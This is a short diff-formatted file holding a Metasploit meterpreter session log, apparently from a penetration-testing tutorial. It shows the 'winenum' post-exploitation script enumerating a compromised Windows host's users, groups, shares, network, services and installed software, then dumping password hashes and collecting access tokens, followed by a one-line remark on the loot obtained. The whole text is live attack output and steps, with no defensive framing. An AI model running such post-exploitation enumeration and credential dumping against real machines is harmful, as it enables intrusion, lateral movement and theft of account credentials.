@@ -1,0 +1,52 @@
+meterpreter > run winenum
+[*] Running Windows Local Enumerion Meterpreter Script
+[*] New session on 192.168.ххх.ххх:1197...
+[*] Saving general report to /root/.msf4/logs/scripts/winenum/MICROSOF-30B51A_20111024.0931/MICROSOF-30B51A_20111024.0931.txt
+[*] Output of each individual command is saved to /root/.msf4/logs/scripts/winenum/MICROSOF-30B51A_20111024.0931
+[*] Checking if MICROSOF-30B51A is a Virtual Machine ........
+[*] UAC is Disabled
+[*] Running Command List ...
+[*] running command net view
+[*] running command netstat -ns
+[*] running command net accounts
+[*] running command netstat -vb
+[*] running command route print
+[*] running command netstat -nao
+[*] running command ipconfig /all
+[*] running command arp -a
+[*] running command cmd.exe /c set
+[*] running command ipconfig /displaydns
+[*] running command tasklist /svc
+[*] running command netsh firewall show config
+[*] running command net group administrators
+[*] running command net view /domain
+[*] running command net localgroup administrators
+[*] running command net localgroup
+[*] running command net user
+[*] running command net group
+[*] running command net session
+[*] running command net share
+[*] running command gpresult /SCOPE USER /Z
+[*] running command gpresult /SCOPE COMPUTER /Z
+[*] Running WMIC Commands ....
+[*] running command wmic netlogin get name,lastlogon,badpasswordcount
+[*] running command wmic nteventlog get path,filename,writeable
+[*] running command wmic netclient list brief
+[*] running command wmic share get name,path
+[*] running command wmic logicaldisk get description,filesystem,name,size
+[*] running command wmic volume list brief
+[*] running command wmic netuse get name,username,connectiontype,localname
+[*] running command wmic service list brief
+[*] running command wmic group list
+[*] running command wmic useraccount list
+[*] running command wmic qfe
+[*] running command wmic product get name,version
+[*] running command wmic rdtoggle list
+[*] running command wmic startup list full
+[*] Extracting software list from registry
+[*] Dumping password hashes...
+[*] Getting Tokens...
+[*] All tokens have been processed
+[*] Done!
+
+We get password hashes, system settings, a list of users and much more.
